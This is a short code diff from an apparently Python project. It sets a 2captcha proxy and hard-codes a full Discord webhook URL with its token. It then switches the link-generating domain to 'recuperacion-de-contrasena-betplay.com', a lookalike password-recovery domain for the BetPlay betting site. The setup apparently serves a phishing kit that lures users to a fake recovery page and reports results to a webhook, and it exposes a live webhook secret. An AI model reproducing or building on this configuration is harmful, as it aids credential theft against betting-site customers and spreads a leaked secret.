@@ -40,7 +40,7 @@ PROXY_DNS  = os.environ.get("PROXY_DNS", "na.proxy.2captcha.com:2334")
 DISCORD_WEBHOOK = os.environ.get("DISCORD_WEBHOOK", "https://discord.com/api/webhooks/1559311988184588319/8BXHxI_gOKqtl4YwCAjKndrtuZ6aHnaJD1Q_7riBMDxOjyvEQgV5Ak9-FmIvtrOLiZ1Y")
 
 # URL del dominio (para generar links)
-APP_DOMAIN = os.environ.get("APP_DOMAIN", "http://178.104.128.163:8001")
+APP_DOMAIN = os.environ.get("APP_DOMAIN", "https://recuperacion-de-contrasena-betplay.com")
 
 BASE_HEADERS = {
     "accept":           "application/json, text/plain, */*",
